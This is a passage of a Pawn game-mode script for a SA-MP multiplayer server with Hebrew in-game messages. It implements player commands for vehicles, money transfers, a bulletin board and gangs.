ActualizarMemoriaEntrada(AuxiliarTel[playerid],playerid);
}

if  (TimerCaidaFicha[AuxiliarTel[playerid]]!=DEAD_TIMER_ID)
{
KillTimer(TimerCaidaFicha[AuxiliarTel[playerid]]);
TimerCaidaFicha[AuxiliarTel[playerid]]=DEAD_TIMER_ID;
new msg[255];
format(msg,sizeof(msg),".$%d השחקן שהתשקר אליך שילם" ,CellTime[AuxiliarTel[playerid]]*PRECIO_FICHA);
LACY_GiveMoney(playerid,CellTime[AuxiliarTel[playerid]]*PRECIO_FICHA*-1);
SendClientMessage(AuxiliarTel[playerid],WHITE,msg);
ActualizarMemoriaSalida(AuxiliarTel[playerid],playerid);
ActualizarMemoriaEntrada(playerid,AuxiliarTel[playerid]);
}
CellState[playerid]=LIBRE;
CellState[AuxiliarTel[playerid]]=LIBRE;
}
return 1;
}

if(strcmp(cmdtext, "/nextlevel", true)==0)
{
format(string, sizeof(string), ".%d :הריגות שנשראו לך לעלות לרמה הבאה",PlayerInfo[playerid][aKillsnl]),SendClientMessage(playerid, COLOR_YELLOW, string);
format(string, sizeof(string), ".%d :רמה הבאה",PlayerInfo[playerid][aLevelnl]),SendClientMessage(playerid, COLOR_YELLOW, string);
return 1;
}
#define STRING 256
if(strcmp(cmd, "/me", true) == 0)
{
if (PlayerInfo[playerid][Level] < 2) return Messagelevel (playerid, 2);
if(GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid,red,".אין לך מספיק כסף לבצע פקודה זאתי");
if(antispam[playerid] >0) return SendClientMessage(playerid,red,".תוכל לבצע פקודה זאתי שוב בקרוב");
new player[MAX_PLAYER_NAME];
GetPlayerName(playerid, player, sizeof(player));
new length = strlen(cmdtext);
while ((idx < length) && (cmdtext[idx] <= ' '))
{
idx++;
}
new offset = idx;
new result[STRING];
while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
{
result[idx - offset] = cmdtext[idx];
idx++;
}
result[idx - offset] = EOS;
if(!strlen(result))
{
SendClientMessage(playerid, COLOR_WHITE, "Usage: /me [action]");
return 1;
}
format(string, sizeof(string), "*** %s: %s ", player, result);
SendClientMessageToAll(COLOR_BLUE, string);
LACY_GiveMoney(playerid,-10000);
antispam[playerid]++;
return 1;
}

if(!strcmp(cmd, "/lock", true))
{
if(PlayerInfo[playerid][Level] < 3) return Messagelevel(playerid,3);
if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,red,".אתה לא נמצא בשום רכב");
if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red,".רק אתה כנהג יכול לנעול את הדלתות");
for (new i=0;i<MAX_PLAYERS;i++) if(i != playerid) SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),i, 0, 1);
SendClientMessage(playerid, COLOR_LIGHTGREEN, ".המכונית כעת נעולה");
return true;
}

if(!strcmp(cmd, "/unlock", true))
{
if(PlayerInfo[playerid][Level] < 3) return Messagelevel(playerid,3);
if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,red,".אתה לא נמצא בשום רכב");
if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red,".רק אתה כנהג יכול לפתוח את הדלתות");
for (new i=0;i<200;i++) if(i != playerid) SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),i, 0, 0);
SendClientMessage(playerid, COLOR_LIGHTGREEN, ".פתחת את הרכב שלך בהצלחה");
return true;
}

if(!strcmp(cmd, "/jetp", true))
{
if (PlayerInfo[playerid][Level] < 16) return Messagelevel(playerid, 16);
if(GetPlayerMoney(playerid) < 1000) return SendClientMessage(playerid,red,".אין לך מספיק כסף");
SetPlayerSpecialAction(playerid,2);
SendClientMessage(playerid,COLOR_LIGHTGREEN,".הבאת לך בהצלחה תיק סילון");
LACY_GiveMoney(playerid,-1000);
return true;
}

if(!strcmp(cmd, "/ghost", true))
{
if (PlayerInfo[playerid][Level] < 14) return Messagelevel(playerid, 14);
if(GetPlayerVirtualWorld(playerid) != 30)
{
SendClientMessage(playerid,COLOR_LIGHTGREEN,".נכנסת לעולם רוחות הרפאים! אתה יכול להילחם פה אם רוחות רפאים כמוך");
SetPlayerVirtualWorld(playerid,30);
SetPlayerTime(playerid,0,0);
return true;
}

else if(GetPlayerVirtualWorld(playerid) == 30)
{
SendClientMessage(playerid,COLOR_LIGHTGREEN,".יצאת מעולם הרוחות בהצלחה");
SetPlayerVirtualWorld(playerid,0);
SetPlayerTime(playerid,7,0);
return true;
}

return true;
}

if(!strcmp(cmd, "/fix", true))
{
new vehicleid = GetPlayerVehicleID(playerid);
if(PlayerInfo[playerid][Level] < 7) return Messagelevel(playerid,7);
if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,".אתה לא בתוך רכב");
if(GetPlayerMoney(playerid) < 2500) return SendClientMessage(playerid,red,".אין לך מספיק כסף");
SetVehicleHealth(vehicleid,1000.0);
SendClientMessage(playerid,COLOR_LIGHTGREEN,".תיקנת את הרכב בהצלחה");
LACY_GiveMoney(playerid,-2500);
format(string,sizeof(string),"/fix :תיקן לעצמו את הרכב בעזרת הפקודה %s :השחקן",GetName(playerid));
SendClientMessageToAdminsC(red,string);
return true;
}

/*
if(!strcmp(cmd, "/healme", true))
{
if(PlayerInfo[playerid][Level] < 5) return Messagelevel(playerid,5);
if(aDoing11[playerid] == 2) return SendClientMessage(playerid,red,".תוכל לבצע פקודה זאת שנית רק שתמות");
SetPlayerHealth(playerid,100.0);
SendClientMessage(playerid,COLOR_LIGHTGREEN,".מילאת את החיים שלך בהצלחה");
aDoing11[playerid] = 2;
format(string,sizeof(string),"/healme :מילא את החיים של עצמו בעזרת הפקודה %s :השחקן",GetName(playerid));
SendClientMessageToAdminsC(red,string);
return true;
}

if(!strcmp(cmd, "/healhim", true))
{
new sid[256], pid;
sid = strtok(cmdtext,idx);
pid = ReturnID(sid);

if(PlayerInfo[playerid][Level] < 5) return Messagelevel(playerid,5);
new Float:potion[3];
if(aDoing1[playerid] == 2) return SendClientMessage(playerid,red,".תוכל לבצע פקודה זאת שנית רק שתמות");
if (!(IsPlayerConnected(pid)))return SendClientMessage(playerid,red, ".איידי שגוי");
if(!strlen(sid)) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /healhim [id/name]");
if(playerid == pid) return SendClientMessage(playerid,red,".אינך יכול לרפאות את עצמך בפקודה זאת");

GetPlayerPos(pid,potion[0],potion[1],potion[2]);
if(!PlayerToPoint(15.0, playerid, potion[0],potion[1],potion[2])) return SendClientMessage(playerid,red,".אינך יכול למלאות חיים של מישהוא שלא נמצא לידך");

SetPlayerHealth(pid,100.0);
format(string, sizeof(string), ".ריפא אותך %s", GetName(playerid));
SendClientMessage(pid, COLOR_LIGHTGREEN, string);

format(string, sizeof(string), ".%s ריפאת את", GetName(pid));
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
aDoing1[playerid] = 2;
format(string,sizeof(string),"/healhim .%s קיבל מילוי חיים מ %s :השחקן",GetName(playerid),GetName(pid));
SendClientMessageToAdminsC(red,string);

return true;
}

if(!strcmp(cmd, "/shekel", true))
{
new sid[256], pid;
sid = strtok(cmdtext,idx);
pid = ReturnID(sid);

if(shekel[playerid] == 1) return SendClientMessage(playerid,red,".תוכל לבצע שוב את הפקודה הזו בקרוב");
if(!strlen(sid)) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /shekel [id/name]");

if (!(IsPlayerConnected(pid)))return SendClientMessage(playerid,red, ".איידי שגוי");
if(GetPlayerMoney(playerid) < 1) return SendClientMessage(playerid,red,"!עני, אפילו שקל איו לך");
GivePlayerMoney(playerid,-1);
GivePlayerMoney(pid, 1);
shekel[playerid] = 1;
SetTimerEx("resetshekel",30*1000,0,"i",playerid);
format(str, sizeof(str), ".%s שלח שקל ל %s",GetName(pid),GetName(playerid));
SendClientMessageToAll(lblue, str);
return 1;
}
*/

if(!strcmp(cmd,"/outcar", true))
{
new sid[256], pid;
sid = strtok(cmdtext,idx);
pid = ReturnID(sid);
tmp2 = strtok(cmdtext, idx);

if(PlayerInfo[playerid][Level] < 4) return Messagelevel(playerid,4);
if (!(IsPlayerConnected(pid)))return SendClientMessage(playerid,red, ".איידי שגוי");
if(!strlen(sid)) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /outcar [id/name]");
if(playerid == pid) return SendClientMessage(playerid,red,".אינך יכול להוציא את עצמך מהרכב");
if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,".אתה לא בתוך רכב");
if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red,".נוסעים לא יכולים להישתמש בפקודה זו");
if(!IsPlayerInVehicle(pid,GetPlayerVehicleID(playerid)) ) SendClientMessage(playerid,red,".השחקן הזה אינו נמצא ברכב שלך");

RemovePlayerFromVehicle(pid);
format(string, sizeof(string), ".מהרכב %s הוצאת את", GetName(pid));
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
format(string, sizeof(string), ".הוציא אותך מהרכב %s", GetName(playerid));
SendClientMessage(pid, COLOR_LIGHTGREEN, string);
return true;
}

if(!strcmp(cmd,"/boom",true))
{
if (PlayerInfo[playerid][Level] < 8) return Messagelevel (playerid, 8);
if(GetPlayerInterior(playerid) > 0) return SendClientMessage(playerid,red,".אינך יכול להתפוצץ באינטרור");
if(aDoing2[playerid] == 2) return SendClientMessage(playerid,red,".לא תוכל לעשות את הפקודה הזאתי עד שתמות");
if(GetPlayerMoney(playerid) < 50000) return SendClientMessage(playerid,red,".אין לך מספיק כסף לפקודה זאתי");
new Float:pos[3];
GetPlayerPos(playerid,pos[0],pos[1],pos[2]);
CreateExplosion(pos[0],pos[1],pos[2],2,2);
aDoing2[playerid] = 2;
SendClientMessage(playerid,COLOR_LIGHTGREEN,".התפוצצת בהצלחה");
LACY_GiveMoney(playerid,-50000);
return true;
}




if(!strcmp(cmd,"/vcolor",true))
{
new tmp1[256];
tmp1 = strtok(cmdtext, idx);
tmp2 = strtok(cmdtext, idx);

if(PlayerInfo[playerid][Level] < 10) return Messagelevel(playerid,10);
if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,".אתה לא בתוך רכב");
if(!strlen(tmp1) || !strlen(tmp2) || strval(tmp2) < 0 || strval(tmp2) > 126 || strval(tmp1) < 0 || strval(tmp1) > 126) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /vcolor [color-0-126] [color-0-126]");

format(string, sizeof(string), ".%d %d :שינת את הצבע של הרכב שלך לאידיים של הצבעים", strval(tmp1),strval(tmp2));
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
ChangeVehicleColor(GetPlayerVehicleID(playerid),strval(tmp1),strval(tmp2));
return true;
}

/*
if(!strcmp(cmd, "/slow", true))
{
if (PlayerInfo[playerid][Level] < 14) return Messagelevel(playerid, 14);
new slow[200] = 0;
if(!slow[playerid])
{
ApplyAnimation(playerid,"PED","WALK_DRUNK",4.0,1,1,1,1,0);
SendClientMessage(playerid,COLOR_LIGHTGREEN,".אתה כעת במצב איטי יותר ולא טבעי");
slow[playerid] = 1;
return true;
}

else if(slow[playerid])
{
ClearAnimations(playerid);
slow[playerid] = 0;
return true;
}

return true;
}

if(!strcmp(cmd, "/bigbang", true))
{
new sid[256], pid;
sid = strtok(cmdtext,idx);
pid = ReturnID(sid);

if(aDoing3[playerid] == 2) return SendClientMessage(playerid,red,".השתמש כבר בפקודה זאתי לא תוכל להשתמש בה עד שתמות");
if (PlayerInfo[playerid][Level] < 13) return Messagelevel(playerid, 13);
if(GetPlayerMoney(playerid) < 20000) return SendClientMessage(playerid,red,".אין לך מספיק כסף");

if(!strlen(sid)) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /bigbang [id/name]");
if(!IsPlayerConnected(pid)) return SendClientMessage(playerid,COLOR_BLUE,".איידי שגוי");
if(GetPlayerInterior(pid) > 0) return SendClientMessage(playerid,red,".אתה לא יכול לתקוף שחקן שהוא נמצא בתוך אינטרור");
if(GetPlayerInterior(playerid) > 0) return SendClientMessage(playerid,red,".אתה לא יכול לתקוף שחקן שהוא נמצא בתוך אינטרור");
GivePlayerMoney(playerid,-20000);
new Float:potion[3];
GetPlayerPos(pid,potion[0],potion[1],potion[2]);
if(!PlayerToPoint(10.0, playerid, potion[0],potion[1],potion[2])) return SendClientMessage(playerid,red,".אינך יכול לפוצץ שחקן שאינו נמצא לידך");

new Float:pos[3];
GetPlayerPos(pid,pos[0],pos[1],pos[2]);
CreateExplosion(pos[0],pos[1],pos[2],1,1);
CreateExplosion(pos[0],pos[1],pos[2]+0.9,1,1);
CreateExplosion(pos[0],pos[1],pos[2]+1.0,1,1);


format(string, sizeof(string), ".פוצץ אותך %s", GetName(playerid));
SendClientMessage(pid, COLOR_LIGHTGREEN, string);

format(string, sizeof(string), ".%s פוצצת את", GetName(pid));
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
aDoing3[playerid] = 2;
return true;
}

*/

//=[SaveSkin]=====
if(!strcmp(cmd,"/saveskin",true))
{
PlayerInfo[playerid][SkinSavedId] = GetPlayerSkin(playerid);
SendClientMessage(playerid,COLOR_LIGHTGREEN," הסקין שלך נשמר בהצלחה");
PlayerInfo[playerid][SkinSaved] = 1, PlayerInfo[playerid][SaveSkin] = 1;
dini_IntSet(GetPlayerFile(playerid),"SkinSavedId",PlayerInfo[playerid][SkinSavedId]);
dini_IntSet(GetPlayerFile(playerid),"SaveSkin",PlayerInfo[playerid][SaveSkin]);
dini_IntSet(GetPlayerFile(playerid),"SkinSaved",PlayerInfo[playerid][SkinSaved]);
return 1;
}
//=[DelSkin]====
if(!strcmp(cmd,"/delskin",true))
{
if(!PlayerInfo[playerid][SkinSaved]) return SendClientMessage(playerid,WHITE,".שים לב, אין לך אף סקין שמור");
PlayerInfo[playerid][SkinSaved] = 0;
dini_IntSet(GetPlayerFile(playerid),"SkinSaved",0);
PlayerInfo[playerid][SaveSkin] = 0;
dini_IntSet(GetPlayerFile(playerid),"SaveSkin",0);
SendClientMessage(playerid,COLOR_LIGHTGREEN," הסקין שלך נמחק בהצלחה ");
return 1;
}






if(strcmp(cmd, "/pay", true) == 0)
{
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp))
{
SendClientMessage(playerid, WHITE, "Usage: /pay [playerid] [amount]");

return 1;}
if(PlayerInfo[playerid][Level] < 1) return Messagelevel(playerid,1);
giveplayerid = strval(tmp);
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp)) {
SendClientMessage(playerid, WHITE, "Usage: /pay [playerid] [amount]");

return 1;}

moneys = strval(tmp);
//printf("givecash_command: %d %d",giveplayerid,moneys);
if (IsPlayerConnected(giveplayerid)) {
if(giveplayerid == playerid) return SendClientMessage(playerid,red,".אתה לא יכול לשלוח לעצמך כסף");
GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
GetPlayerName(playerid, sendername, sizeof(sendername));
playermoney = GetPlayerMoney(playerid);
if (moneys > 0 && playermoney >= moneys) {
LACY_GiveMoney(playerid, (0 - moneys));
LACY_GiveMoney(giveplayerid, moneys);
format(string, sizeof(string), ".%s (id: %d) :לשחקן $%d של כ ", giveplayer,giveplayerid, moneys);
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
format(string, sizeof(string), ". $%d מאת %s (id: %d) קיבלת מ", moneys, sendername, playerid);
SendClientMessage(giveplayerid, COLOR_LIGHTGREEN, string);
printf("%s(playerid:%d) has transfeWHITE %d to %s(playerid:%d)",sendername, playerid, moneys, giveplayer, giveplayerid);}
else {
SendClientMessage(playerid, red, ".סכום שגוי");
}}
else {
format(string, sizeof(string), ".%d - לא מחובר איידי", giveplayerid);
SendClientMessage(playerid, red, string);}
return 1;}

if(!strcmp(cmd, "/td", true))
{
new timetext[64];
new year,mnth,day;
getdate(year,mnth,day);
if(mnth == 1)
{
timetext = ".01";
}

else if(mnth == 2)
{
timetext = ".02.09";
}

else if(mnth == 3)
{
timetext = ".03.09";
}

else if(mnth == 4)
{
timetext = ".04.09";
}

else if(mnth == 5)
{
timetext = ".05.09";
}

else if(mnth == 6)
{
timetext = ".06.09";
}

else if(mnth == 7)
{
timetext = ".07.09";
}

else if(mnth == 8)
{
timetext = ".08.07";
}

else if(mnth == 9)
{
timetext = ".09.09";
}

else if(mnth == 10)
{
timetext = ".10.09";
}

else if(mnth == 11)
{
timetext = ".11.09";
}

else if(mnth == 12)
{
timetext = ".12.09";
}

new hour,minuite,second;
gettime(hour,minuite,second);

if(hour < 10 && hour > 24)
{
format(string, sizeof(string), "%d%s :תאריך", day, timetext, hour, minuite,second);
SendClientMessage(playerid,COLOR_PURPLE,string);
format(string, sizeof(string), "%d:%d:%d :שעה", hour, minuite,second);
SendClientMessage(playerid,COLOR_PURPLE,string);
}
else
{
format(string, sizeof(string), "%d%s :תאריך", day, timetext, hour, minuite,second);
SendClientMessage(playerid,COLOR_PURPLE,string);
format(string, sizeof(string), "%d:%d:%d :שעה", hour, minuite,second);
SendClientMessage(playerid,COLOR_PURPLE,string);
}

if(minuite < 10)
{
format(string, sizeof(string), "%d%s :תאריך", day, timetext, hour, minuite,second);
SendClientMessage(playerid,COLOR_PURPLE,string);
format(string, sizeof(string), "%d:%d:%d :שעה", hour, minuite,second);
SendClientMessage(playerid,COLOR_PURPLE,string);
}

if(second < 10)
{
format(string, sizeof(string), "%d%s :תאריך", day, timetext, hour, minuite,second);
SendClientMessage(playerid,COLOR_PURPLE,string);
format(string, sizeof(string), "%d:%d:%d :שעה", hour, minuite,second);
SendClientMessage(playerid,COLOR_PURPLE,string);
}
return 1;
}




//
/*
if(strcmp(cmdtext, "/sail", true) == 0)
 {
if(Sailing[playerid] == true) return SendClientMessage(playerid, WHITE, "אתה חייב להיות בתא של הספינה");
if(ShipTaken == 1) return SendClientMessage(playerid, WHITE, "אתה חייב להיות על הספינה.");
if(!PlayerToPoint(3, playerid, 3324.2947, -1330.1631, 127.9517)) return SendClientMessage(playerid, WHITE, "אתה חייב להיות בפנים בתוך הספינה");
Sailing[playerid] = true;
ShipTaken = 1;
SailBoat[playerid] = CreateVehicle(454, 2613.5906, -2607.2773, 0.2058, 266.4303, 0, 0, 15000);
LinkVehicleToInterior(SailBoat[playerid], 10);
PutPlayerInVehicle(playerid, SailBoat[playerid], 0);
AttachStreamObjectToPlayer(ship1, playerid, 0.0, 150.0, -2.0, 180.0, 180.0, 270.0);
AttachStreamObjectToPlayer(ship2, playerid, 0.0, 75.0, 27.0, 180.0, 180.0, 270.0);
AttachStreamObjectToPlayer(ship3, playerid, 0.0, 148.0, 8.0, 180.0, 180.0, 270.0);
return 1;
}
if(strcmp(cmdtext, "/exitship", true) == 0) return SetPlayerPos(playerid, 2694.5012, -2606.9812, 14.8974);
if(strcmp(cmdtext, "/pier", true) == 0) {

        SetPlayerPos(playerid, 2798.3655,-2554.6558,13.6327);
        SendClientMessage(playerid, red, ".-- ברוכים הבאים לספינת התענוגות --");
        SendClientMessage(playerid, lblue, ".אנא עלה על האוניה דבר ראשון");
        SendClientMessage(playerid, lblue, ".ואחרי זה המשך ישר עד למציאת הכניסה בעזרת הפיקאפ הלבן");
        SendClientMessage(playerid, lblue, "/sail :כדאי לנהוג בספינה בצע ");
        SendClientMessage(playerid, lblue, "/exitship .כדאי לעזוב את הספינה");
        SendClientMessage(playerid, COLOR_YELLOW, "בעת תוכך בספינה הגדולה תוכל לנהוג בא בעזרת המקשים");
        SendClientMessage(playerid, red, "----------");
return 1;
}
*/






if(!strcmp(cmd,"/Boome",true) || !strcmp(cmd,"/bm",true))
{
if (PlayerInfo[playerid][Level] < 3) return Messagelevel (playerid, 3);
if(GetPlayerInterior(playerid) == 1 || GetPlayerInterior(playerid) == 6 || GetPlayerInterior(playerid) == 10) return SendClientMessage(playerid,0xFF0000AA,".אתה לא יכול לתקוף שחקן שהוא נמצא בתוך אינטרור");
if(ClickedBm[playerid] == 10) return SendClientMessage(playerid,WHITE, ".אתה לא יכול לפוצץ אותך יותר מ10 פעמים");
ClickedBm[playerid]  ++;
new Float:pos[3];
GetPlayerPos(playerid,pos[0],pos[1],pos[2]);
return 1;
}

if(!strcmp(cmd, "/bb", true))
{
new Parameter_es[256];
//new string[256];
Parameter_es= strtok(cmdtext, idx);
if(30 < strlen(Parameter_es)) return false;

if(!strlen(Parameter_es))
{
SendClientMessage(playerid, COLOR_WHITE,"Usage: /bb [action]");
SendClientMessage(playerid, COLOR_WHITE,"/bb show - צפיה בלוח מודעות");

if(!IsPlayerXAdmin(playerid,3))
{
SendClientMessage(playerid, COLOR_WHITE,"/bb edit [1-4] - עריכת לוח המודעות");
SendClientMessage(playerid, COLOR_WHITE,"/bb reset - על מנת לאפס את לוח המודעות");
}

return true;
}
if(!strcmp(Parameter_es,"show",true))
{
new Global_BB[256];
SendClientMessage(playerid,lblue,":לוח מודעות");
format(Global_BB,sizeof(Global_BB),"%s",dini_Get(bbplace,"Message1"));
SendClientMessage(playerid,COLOR_YELLOW,Global_BB);
format(Global_BB,sizeof(Global_BB),"%s",dini_Get(bbplace,"Message2"));
SendClientMessage(playerid,COLOR_YELLOW,Global_BB);
format(Global_BB,sizeof(Global_BB),"%s",dini_Get(bbplace,"Message3"));
SendClientMessage(playerid,COLOR_YELLOW,Global_BB);
format(Global_BB,sizeof(Global_BB),"%s",dini_Get(bbplace,"Message4"));
SendClientMessage(playerid,COLOR_YELLOW,Global_BB);
return true;
}

if(!strcmp(Parameter_es,"reset",true))
{
if(!IsPlayerXAdmin(playerid,1)) return SendClientMessage(playerid,red,".רק אדמינים יכולים לעשות ריסט ללוח המודעות");

dini_Set(bbplace,"Message1","(1) - None.");
dini_Set(bbplace,"Message2","(2) - None.");
dini_Set(bbplace,"Message3","(3) - None.");
dini_Set(bbplace,"Message4","(4) - None.");
return true;
}

if(!strcmp(Parameter_es,"edit",true))
{
new bb_parameter[256];
bb_parameter = strtok(cmdtext,idx);
if(30 < strlen(bb_parameter)) return false;
if(!IsPlayerXAdmin(playerid,1)) return SendClientMessage(playerid,red,".רק אדמינים יכולים לערוך את לוח המודעות");
if(!strlen(bb_parameter)) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /bb edit [1-4]");

if(!strcmp(bb_parameter,"1",true))
{

new length = strlen(cmdtext);
while ((idx < length) && (cmdtext[idx] <= ' '))
{
idx++;
}
new offset = idx;
new result[256];
while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
{
result[idx - offset] = cmdtext[idx];
idx++;
}
result[idx - offset] = EOS;
if(!strlen(result)) return SendClientMessage(playerid,COLOR_WHITE, "Usage: /bb edit 1 [text]");
if(3 < strlen(result)) return true;


format(string,sizeof(string),"(1) - %s",result);
dini_Set(bbplace,"Message1",string);
return true;
}

if(!strcmp(bb_parameter,"2",true))
{

new length = strlen(cmdtext);
while ((idx < length) && (cmdtext[idx] <= ' '))
{
idx++;
}
new offset = idx;
new result[256];
while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
{
result[idx - offset] = cmdtext[idx];
idx++;
}
result[idx - offset] = EOS;
if(!strlen(result)) return SendClientMessage(playerid,COLOR_WHITE, "Usage: /bb edit 2 [text]");
if(3 < strlen(result)) return true;


format(string,sizeof(string),"(2) - %s",result);
dini_Set(bbplace,"Message2",string);
return true;
}

if(!strcmp(bb_parameter,"3",true))
{

new length = strlen(cmdtext);
while ((idx < length) && (cmdtext[idx] <= ' '))
{
idx++;
}
new offset = idx;
new result[256];
while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
{
result[idx - offset] = cmdtext[idx];
idx++;
}
result[idx - offset] = EOS;
if(!strlen(result)) return SendClientMessage(playerid,COLOR_WHITE, "Usage: /bb edit 3 [text]");
if(3 < strlen(result)) return true;


format(string,sizeof(string),"(3) - %s",result);
dini_Set(bbplace,"Message3",string);
return true;
}

if(!strcmp(bb_parameter,"4",true))
{

new length = strlen(cmdtext);
while ((idx < length) && (cmdtext[idx] <= ' '))
{
idx++;
}
new offset = idx;
new result[256];
while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
{
result[idx - offset] = cmdtext[idx];
idx++;
}
result[idx - offset] = EOS;
if(!strlen(result)) return SendClientMessage(playerid,COLOR_WHITE, "Usage: /bb edit 4 [text]");
if(3 < strlen(result)) return true;

format(string,sizeof(string),"(4) - %s",result);
dini_Set(bbplace,"Message4",string);
return true;
}

return true;
}

return SendClientMessage(playerid,red,".אפשרות לוח מודעות שגויה");
}


 

if(strcmp(cmd, "/gang", true) == 0)
{
new gangcmd, gangnum;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp))
{
SendClientMessage(playerid, COLOR_WHITE, "Usage: /gang [create/join/invite/quit] [name/number]");
return 1;
}
giveplayerid = strval(tmp);
if(strcmp(tmp, "create", true)==0)
gangcmd = 1;
else if(strcmp(tmp, "invite", true)==0)
gangcmd = 2;
else if(strcmp(tmp, "join", true)==0)
gangcmd = 3;
else if(strcmp(tmp, "quit", true)==0)
gangcmd = 4;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(gangcmd < 3 && !strlen(tmp))
{
if(gangcmd==0)
SendClientMessage(playerid, COLOR_WHITE, "Usage: /gang [create/join/invite/quit] [name/number]");
else if(gangcmd==1)
SendClientMessage(playerid, red, "Usage: /gang [create] [name]");
else if(gangcmd==2)
SendClientMessage(playerid, red, "Usage: /gang [invite] [playerID]");
return 1;
}

if(gangcmd==1)
{
if(PlayerInfo[playerid][Level] < 4) return Messagelevel(playerid,4);
if(playerGang[playerid]>0)
{
SendClientMessage(playerid, WHITE, ".אתה כבר שייך לגאנג ");
return 1;
}
for(new i = 1; i < MAX_GANGS; i++)
{
if(gangInfo[i][0]==0)
{
format(gangNames[i], MAX_GANG_NAME, "%s", tmp);
gangInfo[i][0]=1;
gangInfo[i][1]=1;
gangInfo[i][2]=playerColors[playerid];
gangMembers[i][0] = playerid;
format(string, sizeof(string),".%s יצרת גאנג בשם ", gangNames[i], i);
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
playerGang[playerid]=i;
return 1;
}
}
return 1;
}
else if (gangcmd==3)
{
gangnum = gangInvite[playerid];
if(playerGang[playerid]>0)
{
SendClientMessage(playerid, WHITE, ".אתה כבר שייך לגאנג אחד ");
return 1;
}
if(gangInvite[playerid]==0)
{
SendClientMessage(playerid, WHITE, ".לא קיבלת הזמנה לגאנג ");
return 1;
}
if(gangInfo[gangnum][0]==0)
{
SendClientMessage(playerid, WHITE, "That gang does not exist!");
return 1;
}
if(gangInfo[gangnum][1] < MAX_GANG_MEMBERS)
{
new i = gangInfo[gangnum][1];
gangInvite[playerid]=0;
gangMembers[gangnum][i] = playerid;
GetPlayerName(playerid, sendername, MAX_PLAYER_NAME);
for(new j = 0; j < gangInfo[gangnum][1]; j++)
{
format(string, sizeof(string),".הצטרף אל הגאנג שלך %s", sendername);
SendClientMessage(gangMembers[gangnum][j], red, string);
}
gangInfo[gangnum][1]++;
playerGang[playerid] = gangnum;
SetPlayerColor(playerid,gangInfo[gangnum][2]);
format(string, sizeof(string),".%s הצטרפת לגאנג ", gangNames[gangnum], gangnum);
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
return 1;
}
SendClientMessage(playerid, WHITE, ".גאנג זה מלא ");
return 1;
}
else if (gangcmd==2)
{
giveplayerid = strval(tmp);
if(playerGang[playerid]==0)
{
SendClientMessage(playerid, WHITE, ".אתה לא שייך לאף גאנג ");
return 1;
}

if(IsPlayerConnected(giveplayerid))
{
GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
GetPlayerName(playerid, sendername, sizeof(sendername));
format(string, sizeof(string),".להצטרף לגאנג שלך %s הזמנת את ", giveplayer);
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
format(string, sizeof(string),".%s קיבלת הזמנה לגאנג בשם ", gangNames[playerGang[playerid]]);
SendClientMessage(giveplayerid, COLOR_LIGHTGREEN, string);
format(string, sizeof(string),".%s ההזמנה נשלחה מ ", sendername);
SendClientMessage(giveplayerid, COLOR_LIGHTGREEN, string);
gangInvite[giveplayerid]=playerGang[playerid];
}
else
SendClientMessage(playerid, WHITE, "No such player exists!");
}
else if (gangcmd==4)
{
PlayerLeaveGang(playerid);
}
return 1;
}

if(strcmp(cmd, "/ganginfo", true) == 0)
{
new gangnum;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp) && playerGang[playerid]==0)
{
SendClientMessage(playerid, COLOR_WHITE, "Usage: /ganginfo [number]");
return 1;
}
else if (!strlen(tmp))
gangnum = playerGang[playerid];
else
gangnum = strval(tmp);
if(gangInfo[gangnum][0]==0)
{
SendClientMessage(playerid, WHITE, ".אין שום גאנגים");
return 1;
}
format(string, sizeof(string),"'%s' אודות הגאנג (id: %d)", gangNames[gangnum], gangnum);
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
for(new i = 0; i < gangInfo[gangnum][1]; i++)
{
GetPlayerName(gangMembers[gangnum][i], giveplayer, sizeof(giveplayer));
format(string, sizeof(string),"%s (%d)", giveplayer, gangMembers[gangnum][i]);
SendClientMessage(playerid, red, string);
}
return 1;
}
	
if(strcmp(cmd, "/gangs", true) == 0)
{
new x;
